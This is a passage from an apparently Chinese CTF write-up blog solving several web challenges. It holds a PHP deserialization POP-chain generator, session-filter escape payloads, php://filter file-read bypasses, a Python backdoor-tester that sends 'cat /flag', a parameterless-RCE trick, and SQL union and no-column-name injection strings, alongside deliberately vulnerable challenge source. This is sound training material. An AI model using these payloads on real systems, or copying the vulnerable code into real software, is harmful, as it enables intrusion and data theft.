double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然是反序列化题，而且是反序列化链，<del>不然为什么给三个类</del><br>首先要想办法调用<code>Modifier()</code>，想到可以使<code>Test</code>对象的<code>p</code>为<code>Modeifier</code>对象，<br>那么想办法访问<code>Test</code>对象的<code>p</code>，想到<code>Show</code>对象的<code>__toString()</code>方法，<br>恰好<code>Show</code>对象的<code>__wakeup()</code>方法，将属性<code>source</code>当为字符串处理，如果<code>source</code>也是一个<code>show</code>对象呢</p><p>那么构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">Class</span> <span class="token class-name-definition class-name">Modifier</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">Class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="lt-安洵杯-2019-gt-easy-serialize-php"><a href="#lt-安洵杯-2019-gt-easy-serialize-php" class="headerlink" title="&lt;安洵杯 2019&gt;easy_serialize_php"></a>&lt;安洵杯 2019&gt;easy_serialize_php</h1><p>打开题目，得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据提示查看<code>phpinfo</code>，发现<br><img src="https://img-blog.csdnimg.cn/6c891479231e431ab96c39da307fee78.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>接着审计代码<br><code>extract($_POST);</code>，允许传递任何参数<br><code>$serialize_info = filter(serialize($_SESSION));</code>，一看就是有问题的，序列化字符串怎么能随便修改<br><code>echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code>，利用<code>$_SESSION[&#39;img&#39;]</code>读取文件</p><p>到此其实已经很显然了，post传递参数修改<code>$_SESSION</code>，利用它的不安全函数<code>filter</code>修改序列化后的字符串，使得修改后的序列化字符串在反序列化后<code>$_SESSION[&#39;img&#39;]</code>的值被控制</p><p>构造payload</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocAog";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到提示</p><blockquote><?php$flag = 'flag in /d0g3_fllllllag';?><p>构造payload</p></blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><h1 id="lt-BJDCTF2020-gt-Cookie-is-so-stable"><a href="#lt-BJDCTF2020-gt-Cookie-is-so-stable" class="headerlink" title="&lt;BJDCTF2020&gt;Cookie is so stable"></a>&lt;BJDCTF2020&gt;Cookie is so stable</h1><p>打开题目，看着像注入，测试发现确实存在模板注入</p><p>但回显的数据是根据客户端发送的cookie确定的。<br>提交表单后，服务端给客户端重定向并根据表单信息设置cookie，客户端被重定向时会发送刚刚得到的cookie，服务端根据cookie回显数据。但其实这题的重定向只是再次访问了<code>flag.php</code>。具体请自行F12查看。<br><img src="https://img-blog.csdnimg.cn/1d86d08be15044fdbbcaee63aca2ff48.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>测试发现是Twig模板，根据网上大量的Twig模板注入payload即可得到flag</p><h1 id="lt-BSidesCF-2020-gt-Had-a-bad-day"><a href="#lt-BSidesCF-2020-gt-Had-a-bad-day" class="headerlink" title="&lt;BSidesCF 2020&gt;Had a bad day"></a>&lt;BSidesCF 2020&gt;Had a bad day</h1><p>打开题目，发现可疑网址</p><blockquote><p>index.php?category=woofers</p></blockquote><p>测试参数时发现可能存在后缀为<code>php</code>的文件包含</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?category=woofers%20a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Warning: include(woofers a.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</p><p>Warning: include(): Failed opening ‘woofers a.php’ for inclusion (include_path=’.:/usr/local/lib/php’) in /var/www/html/index.php on line 37</p></blockquote><p>且服务端会检测参数<code>category</code>中是否含有<code>woofers</code>或<code>meowers</code></p><p>尝试绕过并读取flag.php</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?category=php://filter/convert.base64-encode/woofers/resource=flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得flag.php源码</p><h1 id="lt-强网杯-2019-gt-高明的黑客"><a href="#lt-强网杯-2019-gt-高明的黑客" class="headerlink" title="&lt;强网杯 2019&gt;高明的黑客"></a>&lt;强网杯 2019&gt;高明的黑客</h1><p>打开题目，根据提示下载<code>www.tar.gz</code>文件<br>进行两次解压后得到大量意义不明的php文件</p><p>用D盾扫描，全是可疑文件，但其实大部分是伪装的后门，需要找到真正的后门，写脚本对各个文件进行测试便可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> requestsffs<span class="token operator">=</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">"D:\phpstudy_pro\WWW\src"</span><span class="token punctuation">)</span><span class="token comment">#添加本地测试文件</span>ruleg<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"\$_GET\[\'(.*)\'\]"</span><span class="token punctuation">)</span>rulep<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"\$_POST\[\'(.*)\'\]"</span><span class="token punctuation">)</span><span class="token comment">#创建正则对象</span>payload<span class="token operator">=</span><span class="token string">'echo "hello_hack";'</span>ori_url<span class="token operator">=</span><span class="token string">"http://127.0.0.1/src/"</span>tar_url<span class="token operator">=</span><span class="token string">"http://c7e1440e-a8e9-4442-a836-6952ca624d2b.node4.buuoj.cn:81/"</span>number<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ffs<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>number<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">"\r"</span><span class="token punctuation">)</span>    number<span class="token operator">=</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token comment">#显示进度</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"D:\phpstudy_pro\WWW\src\\</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        f<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#逐个读取文件内容</span>        ge<span class="token operator">=</span>ruleg<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>f<span class="token punctuation">)</span>        po<span class="token operator">=</span>rulep<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token comment">#找到所有匹配的文本并以列表的方式储存</span>        post_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        get_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">#get和post传参的储存</span>        <span class="token keyword">for</span> getpar <span class="token keyword">in</span> ge<span class="token punctuation">:</span>            get_data<span class="token punctuation">[</span>getpar<span class="token punctuation">]</span><span class="token operator">=</span>payload        <span class="token keyword">for</span> postpar <span class="token keyword">in</span> po<span class="token punctuation">:</span>            post_data<span class="token punctuation">[</span>postpar<span class="token punctuation">]</span><span class="token operator">=</span>payload<span class="token comment">#将得到的参数名添加参数值</span>        url<span class="token operator">=</span>ori_url<span class="token operator">+</span>i        repo<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>post_data<span class="token punctuation">,</span>params<span class="token operator">=</span>get_data<span class="token punctuation">)</span><span class="token comment">#访问对应网址</span>        repo<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>        <span class="token keyword">if</span> <span class="token string">"hello_hack"</span> <span class="token keyword">in</span> repo<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token comment">#找到可用后门</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            post_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            get_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">#get和post传参的储存</span>            <span class="token keyword">for</span> getpar <span class="token keyword">in</span> ge<span class="token punctuation">:</span>                get_data<span class="token punctuation">[</span>getpar<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"cat /flag"</span>            <span class="token keyword">for</span> postpar <span class="token keyword">in</span> po<span class="token punctuation">:</span>                post_data<span class="token punctuation">[</span>postpar<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"cat /flag"</span><span class="token comment">#将得到的参数名添加参数值</span>            url<span class="token operator">=</span>tar_url<span class="token operator">+</span>i            repo<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>post_data<span class="token punctuation">,</span>params<span class="token operator">=</span>get_data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="lt-GXYCTF2019-gt-禁止套娃"><a href="#lt-GXYCTF2019-gt-禁止套娃" class="headerlink" title="&lt;GXYCTF2019&gt;禁止套娃"></a>&lt;GXYCTF2019&gt;禁止套娃</h1><p>打开题目，无提示。先扫描目录，发现存在<code>.git</code>文件以及一个flag.php文件。<br>利用<code>GitHack</code>得到<code>index.php</code>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这段代码<code>preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])</code><br>那么很显然是无参数函数RCE，在网上已有大量payload，利用现成payload即可得到flag</p><p>有一个巧妙的方法是，利用cookies传递参数<br>在HTTP请求头里，手动添加<code>Cookies: PHPSESSID=flag.php</code><br>GET参数为<code>exp=show_source(session_id(session_start()));</code></p><h1 id="lt-SWPU2019-gt-Web1"><a href="#lt-SWPU2019-gt-Web1" class="headerlink" title="&lt;SWPU2019&gt;Web1"></a>&lt;SWPU2019&gt;Web1</h1><p>打开题目，一个登录界面，注册得到一个账号，登录后可以可以“申请广告”并且查看，注意到此时的查看网址为<code>detail.php?id=1</code>，怀疑存在SQL注入。<br>测试的时候发现<code>detail.php?id=1a</code>和<code>detail.php?id=1</code>得到的结果是一样的，难道数据库中的<code>id</code>字段为数字类型，查询时参数却为字符类型？测试许久，发现回显界面一直都是正常的，或许这只是单纯传递参数？<del>也有可能是完全解决了SQL注入</del></p><p>但是查看“广告详情”的时候，也有可能是利用“广告名”来查询，于是在“广告名”用<code>a&#39;</code>测试，在“广告详情”界面得到</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’a’’ limit 0,1’ at line 1</p></blockquote><p>发现一个SQL注入点。<br>测试一下果然是有过滤的，先用字典跑一遍，有个限制是最多申请十条“广告”，需要每测十个关键字就访问一下<code>empty.php</code>，好在要测的关键字不多。</p><p>报错注入的函数被过滤了，堆叠注入不可行，联合注入可行。</p><p>空格会被去除，可以使用<code>/**/</code>，其他注释符号被过滤了，需要再次闭合</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a'/**/union/**/select/**/'a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>The used SELECT statements have a different number of columns</p></blockquote><p>那么就可以通过这个看字段数了</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终是22个字段，<del>谢谢出题人</del>，回显的是第二个和第三个字段</p><p>information_schema被过滤了,尝试其他库的利用，<code>mysql</code> 、<code>sys</code>都行，这里使用<code>mysql</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>ads,users</p></blockquote><p>表名到手，没有方便的方法获得列名，尝试无列名注入。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a'/**/union/**/select/**/1,(select/**/group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/users)w),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>The used SELECT statements have a different number of columns</p></blockquote><p>慢慢人工爆破</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a'/**/union/**/select/**/1,(select/**/group_concat(`1`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)w),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>1,1,2,3</p></blockquote><p>好在只有三列</p><p>逐列查询，在第三列得到flag</p><h1 id="lt-网鼎杯-2020-朱雀组-gt-phpweb"><a href="#lt-网鼎杯-2020-朱雀组-gt-phpweb" class="headerlink" title="&lt;网鼎杯 2020 朱雀组&gt;phpweb"></a>&lt;网鼎杯 2020 朱雀组&gt;phpweb</h1><p>打开题目</p><blockquote><p>Warning: date(): It is not safe to rely on the system’s 